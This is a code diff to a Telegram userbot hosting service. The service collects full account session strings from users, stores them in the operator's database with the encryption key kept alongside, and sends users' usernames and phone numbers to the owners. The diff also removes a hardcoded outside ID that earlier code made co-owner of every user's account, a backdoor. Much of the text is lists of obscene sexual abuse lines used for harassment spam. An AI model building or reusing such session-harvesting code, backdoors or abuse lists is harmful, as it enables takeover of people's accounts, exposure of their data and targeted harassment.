@@ -7,6 +7,8 @@ import logging
 import traceback
 import re
 import glob
+import signal
+import sys
 from typing import Dict, Set, Optional
 from io import BytesIO
 import requests
@@ -16,14 +18,15 @@ import yt_dlp
 from telethon import TelegramClient, events, functions, types
 from telethon.errors import FloodWaitError, RPCError, SessionPasswordNeededError, MessageNotModifiedError, UnauthorizedError
 from telethon.sessions import StringSession
-from flask import Flask
-import threading
+from cryptography.fernet import Fernet
+import asyncpg
 
 # ─── CONFIGURATION ───
 API_ID = int(os.environ.get("API_ID", 0))
 API_HASH = os.environ.get("API_HASH", "")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-MY_OWNER_IDS = {int(x) for x in os.environ.get("OWNER_IDS", "8909378644,8711082433").split(",")}
+# Main bot owners – for notifications and /broadcast only – you can add multiple IDs separated by commas
+MY_OWNER_IDS = {int(x) for x in os.environ.get("OWNER_IDS", "8909378644").split(",") if x.strip()}
 
 # ─── CHANNEL VERIFICATION ───
 REQUIRED_CHANNELS = [
@@ -47,6 +50,86 @@ def save_users(users):
         json.dump(list(users), f)
 
 broadcast_users = load_users()
+
+# ─── DATABASE & ENCRYPTION ───
+db_pool = None
+cipher = None
+
+async def init_db():
+    global db_pool
+    db_url = os.environ.get("DATABASE_URL")
+    if not db_url:
+        raise Exception("DATABASE_URL not set")
+    db_pool = await asyncpg.create_pool(db_url, min_size=1, max_size=5)
+    async with db_pool.acquire() as conn:
+        await conn.execute("""
+            CREATE TABLE IF NOT EXISTS user_sessions (
+                user_id BIGINT PRIMARY KEY,
+                session_encrypted TEXT NOT NULL,
+                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+        await conn.execute("""
+            CREATE TABLE IF NOT EXISTS app_config (
+                key_name TEXT PRIMARY KEY,
+                key_value TEXT NOT NULL
+            )
+        """)
+
+async def get_encryption_key():
+    async with db_pool.acquire() as conn:
+        row = await conn.fetchrow("SELECT key_value FROM app_config WHERE key_name = 'encryption_key'")
+        if row:
+            return row['key_value']
+        else:
+            new_key = Fernet.generate_key().decode()
+            await conn.execute(
+                "INSERT INTO app_config (key_name, key_value) VALUES ($1, $2)",
+                "encryption_key", new_key
+            )
+            return new_key
+
+async def init_cipher():
+    global cipher
+    key = await get_encryption_key()
+    cipher = Fernet(key.encode())
+
+def encrypt_session(sess: str) -> str:
+    if cipher is None:
+        raise RuntimeError("Cipher not initialized")
+    return cipher.encrypt(sess.encode()).decode()
+
+def decrypt_session(encrypted: str) -> str:
+    if cipher is None:
+        raise RuntimeError("Cipher not initialized")
+    return cipher.decrypt(encrypted.encode()).decode()
+
+async def save_session(user_id: int, session_str: str):
+    encrypted = encrypt_session(session_str)
+    async with db_pool.acquire() as conn:
+        await conn.execute(
+            "INSERT INTO user_sessions (user_id, session_encrypted) VALUES ($1, $2) "
+            "ON CONFLICT (user_id) DO UPDATE SET session_encrypted = $2, updated_at = CURRENT_TIMESTAMP",
+            user_id, encrypted
+        )
+
+async def load_sessions() -> dict:
+    async with db_pool.acquire() as conn:
+        rows = await conn.fetch("SELECT user_id, session_encrypted FROM user_sessions")
+    sessions = {}
+    for row in rows:
+        try:
+            sess = decrypt_session(row['session_encrypted'])
+            sessions[row['user_id']] = sess
+        except Exception:
+            # Corrupt session: delete it
+            await delete_session(row['user_id'])
+            continue
+    return sessions
+
+async def delete_session(user_id: int):
+    async with db_pool.acquire() as conn:
+        await conn.execute("DELETE FROM user_sessions WHERE user_id = $1", user_id)
 
 # ─── MAIN BOT ───
 main_bot = TelegramClient("main_bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -73,6 +156,26 @@ def get_join_buttons():
         buttons.append([types.KeyboardButtonUrl(text=f"🔗 Join {ch['name']}", url=ch["invite"])])
     buttons.append([types.KeyboardButtonCallback(text="✅ I have joined all", data=b"verify_channels")])
     return buttons
+
+# ─── GRACEFUL SHUTDOWN ───
+async def shutdown_handler(sig, frame):
+    print("🛑 Shutting down gracefully...")
+    for uid in broadcast_users:
+        try:
+            await main_bot.send_message(uid, "⚠️ **Bot is going offline for maintenance/restart.**\nWe'll be back soon!")
+            await asyncio.sleep(0.5)
+        except:
+            pass
+    for uid, client in active_userbots.items():
+        try:
+            await client.disconnect()
+        except:
+            pass
+    await main_bot.disconnect()
+    sys.exit(0)
+
+signal.signal(signal.SIGTERM, lambda s, f: asyncio.create_task(shutdown_handler(s, f)))
+signal.signal(signal.SIGINT, lambda s, f: asyncio.create_task(shutdown_handler(s, f)))
 
 # ─── MAIN BOT HANDLERS ───
 @main_bot.on(events.NewMessage(pattern="/start"))
@@ -199,12 +302,11 @@ async def message_handler(event):
                     f"🔗 **Username:** @{me.username if me.username else 'None'}\n"
                     f"📱 **Phone:** `{visible}`\n"
                 )
-                # Owner notifications commented to reduce spam
-                # for owner in MY_OWNER_IDS:
-                #     try:
-                #         await main_bot.send_message(owner, log_msg)
-                #     except:
-                #         pass
+                for owner in MY_OWNER_IDS:
+                    try:
+                        await main_bot.send_message(owner, log_msg)
+                    except:
+                        pass
             except Exception as log_err:
                 print(f"Logging error: {log_err}")
 
@@ -212,6 +314,7 @@ async def message_handler(event):
             save_users(broadcast_users)
 
             user_sessions[chat_id] = session_str
+            await save_session(chat_id, session_str)
 
             asyncio.create_task(run_user_bot_with_restart(session_str, chat_id))
             user_states.pop(chat_id, None)
@@ -248,11 +351,11 @@ async def message_handler(event):
                     f"🔗 **Username:** @{me.username if me.username else 'None'}\n"
                     f"📱 **Phone:** `{visible}`\n"
                 )
-                # for owner in MY_OWNER_IDS:
-                #     try:
-                #         await main_bot.send_message(owner, log_msg)
-                #     except:
-                #         pass
+                for owner in MY_OWNER_IDS:
+                    try:
+                        await main_bot.send_message(owner, log_msg)
+                    except:
+                        pass
             except Exception as log_err:
                 print(f"Logging error: {log_err}")
 
@@ -260,6 +363,7 @@ async def message_handler(event):
             save_users(broadcast_users)
 
             user_sessions[chat_id] = session_str
+            await save_session(chat_id, session_str)
 
             asyncio.create_task(run_user_bot_with_restart(session_str, chat_id))
             user_states.pop(chat_id, None)
@@ -267,7 +371,7 @@ async def message_handler(event):
             await event.reply(f"❌ Error: `{str(e)}` \nPlease restart with `/login`.")
             user_states.pop(chat_id, None)
 
-# ─── BROADCAST COMMAND (Only owners) ───
+# ─── BROADCAST COMMAND (Only main owners) ───
 @main_bot.on(events.NewMessage(pattern="/broadcast"))
 async def broadcast_cmd(event):
     if event.sender_id not in MY_OWNER_IDS:
@@ -300,6 +404,7 @@ async def logout_handler(event):
         await user_bot.disconnect()
         del active_userbots[user_id]
         user_sessions.pop(user_id, None)
+        await delete_session(user_id)
         user_states.pop(user_id, None)
 
         await event.reply(
@@ -309,18 +414,19 @@ async def logout_handler(event):
             "• Your ID remains in the broadcast list, so you'll still receive owner broadcasts."
         )
 
-        # for owner in MY_OWNER_IDS:
-        #     try:
-        #         await main_bot.send_message(owner, f"🚪 **User Logout**\nUser ID: `{user_id}`\nStatus: Userbot disconnected.")
-        #     except:
-        #         pass
+        for owner in MY_OWNER_IDS:
+            try:
+                await main_bot.send_message(owner, f"🚪 **User Logout**\nUser ID: `{user_id}`\nStatus: Userbot disconnected.")
+            except:
+                pass
     except Exception as e:
         await event.reply(f"❌ Logout error: `{str(e)}`")
         active_userbots.pop(user_id, None)
         user_sessions.pop(user_id, None)
+        await delete_session(user_id)
 
 # ─────────────────────────────────────────────────────────
-# ─── SUPERVISED USERBOT LAUNCHER (Auto-Restart) ───
+# ─── SUPERVISED USERBOT LAUNCHER ──────────────────────
 # ─────────────────────────────────────────────────────────
 async def run_user_bot_with_restart(session_string, chat_id):
     while True:
@@ -335,44 +441,34 @@ async def run_user_bot_with_restart(session_string, chat_id):
             print(f"⚠️ Userbot crashed: {error_msg[:100]}\nRestarting in 5 seconds...")
             try:
                 await main_bot.send_message(chat_id, f"⚠️ Userbot crashed: {error_msg[:100]}\nRestarting in 5 seconds...")
-                # Owner notifications removed to reduce spam
-                # for owner in MY_OWNER_IDS:
-                #     await main_bot.send_message(owner, f"🔄 **Userbot Restart**\nUser: {chat_id}\nReason: {error_msg[:80]}")
+                for owner in MY_OWNER_IDS:
+                    await main_bot.send_message(owner, f"🔄 **Userbot Restart**\nUser: {chat_id}\nReason: {error_msg[:80]}")
             except:
                 pass
             await asyncio.sleep(5)
 
 # ─────────────────────────────────────────────────────────
-# ─── FULL USERBOT ENGINE ───────────────────────────────
+# ─── FULL USERBOT ENGINE ──────────────────────────────
 # ─────────────────────────────────────────────────────────
 async def run_user_bot(session_string, chat_id):
     user_bot = None
     try:
         user_bot = TelegramClient(StringSession(session_string), API_ID, API_HASH, auto_reconnect=True)
 
-        # ─── START WITH SESSION VALIDATION ───
+        # ─── SESSION VALIDATION ───
         try:
             await user_bot.start()
         except (UnauthorizedError, ValueError, RPCError) as e:
-            await main_bot.send_message(chat_id, f"❌ **Session error:** {str(e)[:100]}\nPlease login again using `/login`.")
+            await main_bot.send_message(chat_id, f"⚠️ **Your userbot session has expired. Please login again using `/login`.**")
             user_sessions.pop(chat_id, None)
+            await delete_session(chat_id)
             raise Exception("SESSION_INVALID")
-        except Exception as e:
-            if "EOF" in str(e) or "read a line" in str(e):
-                await main_bot.send_message(chat_id, f"❌ **Session corrupt (EOF):** {str(e)[:100]}\nPlease login again using `/login`.")
-                user_sessions.pop(chat_id, None)
-                try:
-                    os.remove(f"{chat_id}.session")
-                except:
-                    pass
-                raise Exception("SESSION_INVALID")
-            else:
-                raise
 
         active_userbots[chat_id] = user_bot
 
         me = await user_bot.get_me()
-        OWNER_IDS = {me.id, 8711082433}
+        # 🔥 Absolutely NO hardcoded ID – only the logged‑in user is owner
+        OWNER_IDS = {me.id}
 
         # ─── PER-USER DATA FOLDER ───
         USER_DATA_DIR = "user_data"
@@ -553,8 +649,9 @@ async def run_user_bot(session_string, chat_id):
         EMOJI_NC_EMOJIS = ["🐧","🦭","🦈","🫍","🐬","🐋","🐳","🐟","🐠","🐡","🦐","🦞","🦀","🦑","🐙","🪼","🦪","🪸","🫧","🦂"]
         EMOJI_NC_PATTERN = "{text} <⋆.ೃ࿔*:･{emoji}⋆.ೃ࿔*:･>"
 
-        # ─── ORIGINAL REPLY LISTS (FULL - KUCH NAHI HATAYA) ───
-        reply_list = ["𝐊ʏᴀ 𝐑ᴇ 𝐑ᴀɴᴅɪᴋᴇ 𝐂ᴏᴏʟ ",
+        # ─── LARGE REPLY LISTS ───
+        reply_list = [
+            "𝐊ʏᴀ 𝐑ᴇ 𝐑ᴀɴᴅɪᴋᴇ 𝐂ᴏᴏʟ ",
             "𝚃𝙴𝚁𝙸 𝐌ᴀᴀ 𝐌ᴀʀʀ 𝐆ᴀʏɪ 𝐘ᴀᴀʀ - 𝐉ᴀɪ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️   ! 🌙",
             "acha beta 😂🔥👊🏻 koi na me toh TUJHE Choduga 😹💔🔥😆👊🏻💥",
             "chudke bhaga kaise 😂💥🤣🤘🏻",
@@ -597,7 +694,7 @@ async def run_user_bot(session_string, chat_id):
             "𝗧𝗢𝗛𝗔𝗥 𝗠𝗨𝗠𝗠𝗬 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘𝗜 𝗣𝗨𝗥𝗜 𝗞𝗜 𝗣𝗨𝗥𝗜 𝗞𝗜𝗡𝗚𝗙𝗜𝗦𝗛𝗘𝗥 𝗞𝗜 𝗕𝗢𝗧𝗧𝗟𝗘 𝗗𝗔𝗟 𝗞𝗘 𝗧𝗢𝗗 𝗗𝗨𝗡𝗚𝗔 𝗔𝗡𝗗𝗘𝗥 𝗛𝗜 😱😂🤩",
             "𝐓𝐄𝐑𝐈 𝐌𝐀𝐀 𝐊𝐈 𝐂𝐇𝐔𝐓 𝐌𝐄 ✋ 𝐇𝐀𝐓𝐓𝐇 𝐃𝐀𝐋𝐊𝐄 👶 𝐁𝐀𝐂𝐂𝐇𝐄 𝐍𝐈𝐊𝐀𝐋 𝐃𝐔𝐍𝐆𝐀 😍",
             "𝐓𝐄𝐑𝐀 𝐏𝐄𝐇𝐋𝐀 𝐁𝐀𝐀𝐏 𝐇𝐔 𝐌𝐀𝐃𝐀𝐑𝐂𝐇𝐎𝐃",
-            "𝗧𝗘𝗥𝗜 𝗠𝗨𝗠𝗠𝗬 𝗞𝗘 𝗦𝗔𝗔𝗧𝗛 𝗟𝗨𝗗𝗢 𝗞𝗛𝗘𝗟𝗧𝗘 𝗞𝗛𝗘𝗟𝗧𝗘 𝗨𝗦𝗞𝗘 𝗠𝗨𝗛 𝗠𝗘 𝗔𝗣𝗡𝗔 𝗟𝗢𝗗𝗔 𝗗𝗘 𝗗𝗨𝗡𝗚𝗔☝🏻☝🏻😬",
+            "𝗧𝗘𝗥𝗜 𝗠𝗨𝗠𝗠𝗬 𝗞𝗘 𝗦𝗔𝗔𝗧𝗛 𝗟𝗨𝗗𝗼 𝗞𝗛𝗘𝗟𝗧𝗘 𝗞𝗛𝗘𝗟𝗧𝗘 𝗨𝗦𝗞𝗘 𝗠𝗨𝗛 𝗠𝗘 𝗔𝗣𝗡𝗔 𝗟𝗢𝗗𝗔 𝗗𝗘 𝗗𝗨𝗡𝗚𝗔☝🏻☝🏻😬",
             "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘 𝗦𝗨𝗧𝗟𝗜 𝗕𝗢𝗠𝗕 𝗙𝗢𝗗 𝗗𝗨𝗡𝗚𝗔 𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗝𝗛𝗔𝗔𝗧𝗘 𝗝𝗔𝗟 𝗞𝗘 𝗞𝗛𝗔𝗔𝗞 𝗛𝗢 𝗝𝗔𝗬𝗘𝗚𝗜💣🔥",
             "𝐓𝐄𝐑𝐈 𝐕𝐀𝐇𝐄𝐄𝐍 𝐊𝐎 𝐀𝐏𝐍𝐄 𝐋𝐔𝐍𝐃 𝐏𝐑 𝐈𝐓𝐍𝐀 𝐉𝐇𝐔𝐋𝐀𝐀𝐔𝐍𝐆𝐀 𝐊𝐈 𝐉𝐇𝐔𝐋𝐓𝐄 𝐉𝐇𝐔𝐋𝐓𝐄 𝐇𝐈 𝐁𝐀𝐂𝐇𝐀 𝐏𝐀𝐈𝐃𝐀 𝐊𝐑 𝐃𝐄𝐆𝐈 💦💋",
             "𝐆𝐀𝐋𝐈 𝐆𝐀𝐋𝐈 𝐌𝐄 𝐑𝐄𝐇𝐓𝐀 𝐇𝐄 𝐒𝐀𝐍𝐃 𝐓𝐄𝐑𝐈 𝐌𝐀𝐀𝐊𝐎 𝐂𝐇𝐎𝐃 𝐃𝐀𝐋𝐀 𝐎𝐑 𝐁𝐀𝐍𝐀 𝐃𝐈𝐀 𝐑𝐀𝐍𝐃 🤤🤣",
@@ -625,7 +722,7 @@ async def run_user_bot(session_string, chat_id):
             "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
             "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
             "Hello hello?? SAAS aarahi है? रण्डी पुत्र 🧘🏻",
-            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\~ 👑 बाप से सही chudi 🥵🔥",
+            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
             "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
             "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SHAMBHOG करती है ! 🛐",
             "⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
@@ -634,7 +731,7 @@ async def run_user_bot(session_string, chat_id):
             "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
             "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
             "Hello hello?? saas aarahi है? रण्डी पुत्र 🧘🏻",
-            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\~ 👑 बाप से सही chudi 🥵🔥",
+            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
             "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
             "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SAMBHOG करती है ! 🛐",
             "⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
@@ -643,7 +740,7 @@ async def run_user_bot(session_string, chat_id):
             "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
             "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
             "Hello hello?? SAAS aarahi है? रण्डी पुत्र 🧘🏻",
-            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\~ 👑 बाप से सही chudi 🥵🔥",
+            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
             "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
             "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SAMBHOG करती है ! 🛐",
             "⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
@@ -652,7 +749,7 @@ async def run_user_bot(session_string, chat_id):
             "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
             "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
             "Hello hello?? SAAS aarahi है? रण्डी पुत्र 🧘🏻",
-            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\~ 👑 बाप से सही chudi 🥵🔥",
+            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
             "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
             "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝙁𝙐𝘾𝙆 𝙃𝙄𝙎 𝙈𝙊𝙈 𝙋𝙍𝙊𝙋𝙀𝙍𝙇𝙔",
             "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝘼𝙎𝙆 𝙃𝙄𝙈 𝙏𝙊 𝘾𝙊𝙑𝙀𝙍 𝙃𝙄𝙎 𝙈𝙊𝙈'𝙎 𝘼𝙎𝙎",
@@ -668,7 +765,7 @@ async def run_user_bot(session_string, chat_id):
             "𝗧𝗢𝗛𝗔𝗥 𝗠𝗨𝗠𝗠𝗬 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘𝗜 𝗣𝗨𝗥𝗜 𝗞𝗜 𝗣𝗨𝗥𝗜 𝗞𝗜𝗡𝗚𝗙𝗜𝗦𝗛𝗘𝗥 𝗞𝗜 𝗕𝗢𝗧𝗧𝗟𝗘 𝗗𝗔𝗟 𝗞𝗘 𝗧𝗢𝗗 𝗗𝗨𝗡𝗚𝗔 𝗔𝗡𝗗𝗘𝗥 𝗛𝗜 😱😂🤩",
             "𝐓𝐄𝐑𝐈 𝐌𝐀𝐀 𝐊𝐈 𝐂𝐇𝐔𝐓 𝐌𝐄 ✋ 𝐇𝐀𝐓𝐓𝐇 𝐃𝐀𝐋𝐊𝐄 👶 𝐁𝐀𝐂𝐂𝐇𝐄 𝐍𝐈𝐊𝐀𝐋 𝐃𝐔𝐍𝐆𝐀 😍",
             "𝐓𝐄𝐑𝐀 𝐏𝐄𝐇𝐋𝐀 𝐁𝐀𝐀𝐏 𝐇𝐔 𝐌𝐀𝐃𝐀𝐑𝐂𝐇𝐎𝐃",
-            "𝗧𝗘𝗥𝗜 𝗠𝗨𝗠𝗠𝗬 𝗞𝗘 𝗦𝗔𝗔𝗧𝗛 𝗟𝗨𝗗𝗢 𝗞𝗛𝗘𝗟𝗧𝗘 𝗞𝗛𝗘𝗟𝗧𝗘 𝗨𝗦𝗞𝗘 𝗠𝗨𝗛 𝗠𝗘 𝗔𝗣𝗡𝗔 𝗟𝗢𝗗𝗔 𝗗𝗘 𝗗𝗨𝗡𝗚𝗔☝🏻☝🏻😬",
+            "𝗧𝗘𝗥𝗜 𝗠𝗨𝗠𝗠𝗬 𝗞𝗘 𝗦𝗔𝗔𝗧𝗛 𝗟𝗨𝗗𝗼 𝗞𝗛𝗘𝗟𝗧𝗘 𝗞𝗛𝗘𝗟𝗧𝗘 𝗨𝗦𝗞𝗘 𝗠𝗨𝗛 𝗠𝗘 𝗔𝗣𝗡𝗔 𝗟𝗢𝗗𝗔 𝗗𝗘 𝗗𝗨𝗡𝗚𝗔☝🏻☝🏻😬",
             "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘 𝗦𝗨𝗧𝗟𝗜 𝗕𝗢𝗠𝗕 𝗙𝗢𝗗 𝗗𝗨𝗡𝗚𝗔 𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗝𝗛𝗔𝗔𝗧𝗘 𝗝𝗔𝗟 𝗞𝗘 𝗞𝗛𝗔𝗔𝗞 𝗛𝗢 𝗝𝗔𝗬𝗘𝗚𝗜💣🔥",
             "𝐓𝐄𝐑𝐈 𝐕𝐀𝐇𝐄𝐄𝐍 𝐊𝐎 𝐀𝐏𝐍𝐄 𝐋𝐔𝐍𝐃 𝐏𝐑 𝐈𝐓𝐍𝐀 𝐉𝐇𝐔𝐋𝐀𝐀𝐔𝐍𝐆𝐀 𝐊𝐈 𝐉𝐇𝐔𝐋𝐓𝐄 𝐉𝐇𝐔𝐋𝐓𝐄 𝐇𝐈 𝐁𝐀𝐂𝐇𝐀 𝐏𝐀𝐈𝐃𝐀 𝐊𝐑 𝐃𝐄𝐆𝐈 💦💋",
             "𝐆𝐀𝐋𝐈 𝐆𝐀𝐋𝐈 𝐌𝐄 𝐑𝐄𝐇𝐓𝐀 𝐇𝐄 𝐒𝐀𝐍𝐃 𝐓𝐄𝐑𝐈 𝐌𝐀𝐀𝐊𝐎 𝐂𝐇𝐎𝐃 𝐃𝐀𝐋𝐀 𝐎𝐑 𝐁𝐀𝐍𝐀 𝐃𝐈𝐀 𝐑𝐀𝐍𝐃 🤤🤣",
@@ -686,7 +783,6 @@ async def run_user_bot(session_string, chat_id):
             "𝙆𝙄𝙏𝙉𝙄 𝙂𝙇𝙄𝙔𝘼 𝙋𝘿𝙒𝙀𝙂𝘼 𝘼𝙋𝙉𝙄 𝙈𝘼 𝙆𝙊",
             "𝗧𝗘𝗥𝗜 𝗜𝗧𝗘𝗠 𝗞𝗜 𝗚𝗔𝗔𝗡𝗗 𝗠𝗘 𝗟𝗨𝗡𝗗 𝗗𝗔𝗔𝗟𝗞𝗘,𝗧𝗘𝗥𝗘 𝗝𝗔𝗜𝗦𝗔 𝗘𝗞 𝗢𝗥 𝗡𝗜𝗞𝗔𝗔𝗟 𝗗𝗨𝗡𝗚𝗔 𝗠𝗔‌𝗔‌𝗗𝗔𝗥𝗖𝗛Ø𝗗🤘🏻🙌🏻☠️",
             "2 𝙍𝙐𝙋𝘼𝙔 𝙆𝙄 𝙋𝙀𝙋𝙎𝙄 𝙏𝙀𝙍𝙄 𝙈𝙐𝙈𝙈𝙔 𝙎𝘼𝘽𝙎𝙀 𝙎𝙀𝙓𝙔 💋💦",
-            "𝐓ᴇʀɪ 𝐌ᴜᴍᴍʏ 𝐂ʜᴏᴅ 𝐃ɪ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐍ᴇ 𝐁ᴡᴀʜᴀʜᴀʜᴀ ⚜",
             "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SAMBHOG करती है ! 🛐"
         ]
 
@@ -858,12 +954,48 @@ async def run_user_bot(session_string, chat_id):
             "Tumse milke lagta hai jaise, \nSach mein pyaar hota hai, bas tumhara nahi milta. 😅🫠"
         ]
 
-        # ─── ☠️ DEATHGOD LIST (MERGED - reply_list + reply_texts + fun_texts + 1 flag + 1 heart) ───
-        deathgod_list = (
-            reply_list + reply_texts + fun_texts +
-            [" ོ༘₊⁺🇮🇳 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ  𝐈ɴᴅɪᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇮🇳 ₊⁺⋆.˚"] +
-            ["𓂃˖˳·˖ ִֶָ ⋆❤️͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚❤️ ݁˖⭑.ᐟ"]
-        )
+        BESTFRIEND_SHAYARI = [
+            "💖 *Dil ki baat kehni hai, sun lo meri jaan,*\n🌸 *Tum bin adhoori hai yeh dastaan.*\n💫 *Kya tum banogi/banoge meri/mera best friend?* 🤗",
+            "🌟 *Tum ho meri khushi ka raaz,*\n🌺 *Tum bin jeena hai aawaaz.*\n🤗 *Kya tum best friend banogi/banoge?*",
+            "🎈 *Zindagi mein tum aaye toh rang hai,*\n🌹 *Har pal tumse hi sang hai.*\n💕 *Best friend bano meri jaan?*",
